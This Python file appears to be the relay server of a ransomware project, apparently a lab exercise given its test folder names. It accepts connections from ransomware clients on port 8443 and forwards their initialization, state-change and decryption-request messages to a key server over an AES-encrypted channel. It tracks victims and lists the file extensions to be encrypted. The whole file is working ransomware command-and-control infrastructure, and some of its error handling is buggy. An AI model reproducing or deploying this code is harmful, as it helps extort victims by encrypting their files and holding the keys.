import queue
import threading
import utile.network as network
import utile.message as message
import utile.security as security


# Constantes
IP_SERV_CLES = network.LOCAL_IP
PORT_SERV_CLES = 8381
CONN_RETRY_SERV_CLES = 20
IP_RANSOMWARE = "0.0.0.0"
PORT_RANSOMWARE = 8443
CONFIG_SERVEUR = {}
CONFIG_WORKSTATION = {
    'HASH': None,
    'KEY': None,
    'DISKS': None,
    'PATHS': ['tests_1', 'tests_2'],
    'FILE_EXT': ['.jpg', '.png', '.txt', '.avi', '.mp4', '.mp3', '.pdf'],
    'FREQ': 120,
    'OS': None,
    'STATE': None,
}

# Variable globale
status_victims = {}

# Variable
serv_cles_queue = queue.Queue()
ransomware_queue = queue.Queue()


def handle_serv_cles():
    serv_cle_socket = network.connect_to_serv(IP_SERV_CLES, PORT_SERV_CLES, CONN_RETRY_SERV_CLES)
    print("Connected to serveur de clés")
    key_serv_cle = security.diffie_hellman_send_key(serv_cle_socket)
    while True:
        try:
            serv_cle_socket.settimeout(1)
            response_serv_cle_crypt = network.receive_message(serv_cle_socket)
            if response_serv_cle_crypt:
                response_serv_cle = security.aes_decrypt(response_serv_cle_crypt, key_serv_cle)
                response_type = message.get_message_type(response_serv_cle)
                if response_type == "DECRYPT":
                    print("Message DECRYPT reçu du serveur de clés :", response_serv_cle)
                    serv_cles_queue.put(response_serv_cle)
                else:
                    serv_cles_queue.put(response_serv_cle)
                    print("Autre message reçu du serveur de clés :", response_serv_cle)
        except serv_cle_socket.timeout(1):
            print("Aucun message recu de la part du serveur clés")
            pass  # Ignore les exceptions dues au timeout
        except Exception as e:
            pass
            print("Erreur lors de la réception du message :", str(e))
        if not ransomware_queue.empty():
            message_ransomware, socket_ransomware = ransomware_queue.get()
            type_message = message.get_message_type(message_ransomware)
            print("Type message : ", type_message)
            if type_message == "INITIALIZE":
                CONFIG_WORKSTATION['DISKS'] = message_ransomware['DISKS']
                CONFIG_WORKSTATION['OS'] = message_ransomware['OS']
                message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
                network.send_message(serv_cle_socket, message_serv_cle_crypt)
                response_serv_cle_crypt = network.receive_message(serv_cle_socket)
                response_serv_cle = security.aes_decrypt(response_serv_cle_crypt, key_serv_cle)
                serv_cles_queue.put(response_serv_cle)
                print("Message envoyé : ", message_ransomware)
                print(CONFIG_WORKSTATION)
            elif type_message == "CHGSTATE":
                message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
                network.send_message(serv_cle_socket, message_serv_cle_crypt)
                print("Message envoyé : ", message_ransomware)
            elif type_message == "PENDING_SIGNAL":
                message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
                network.send_message(serv_cle_socket, message_serv_cle_crypt)
                print("Message envoyé : ", message_ransomware)
            elif type_message == "PROTECTREQ":
                nb_files_decrypt = message_ransomware['NB_FILES']
                message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
                network.send_message(serv_cle_socket, message_serv_cle_crypt)
                print("Message envoyé : ", message_ransomware)
                response_serv_cle_crypt = network.receive_message(serv_cle_socket)
                response_serv_cle = security.aes_decrypt(response_serv_cle_crypt, key_serv_cle)
                print("Message reçu : ", response_serv_cle)
                message_to_ransomware = message.set_message("PROTECTRESP", [response_serv_cle['COUNT'], "We decrypted " + str(nb_files_decrypt) + " files out of " + str(response_serv_cle['NB_FILES']) + " encrypted files"])
                serv_cles_queue.put(message_to_ransomware)




def handle_ransomware():
    ransomware_socket = network.start_net_serv(IP_RANSOMWARE, PORT_RANSOMWARE)
    while True:
        client_socket, address = ransomware_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()


def handle_client(socket_client):
    while True:
        message_ransomware = network.receive_message(socket_client)
        print("Message reçu : ", message_ransomware)
        if message_ransomware is not None:
            ransomware_queue.put((message_ransomware, socket_client))
        else:
            break
        while serv_cles_queue.empty():
            if message.get_message_type(message_ransomware) == ("CHGSTATE" or "PENDING_SIGNAL"):
                break
            pass
        else:
            while not serv_cles_queue.empty():
                message_to_ransomware = serv_cles_queue.get()
                network.send_message(socket_client, message_to_ransomware)
                print("Message envoyé au ransomware: ", message_to_ransomware)


def main():
    global CONFIG_SERVEUR, CONFIG_WORKSTATION
    serv_cle = threading.Thread(target=handle_serv_cles)
    serv_cle.start()
    ransomware = threading.Thread(target=handle_ransomware)
    ransomware.start()


if __name__ == '__main__':
    main()
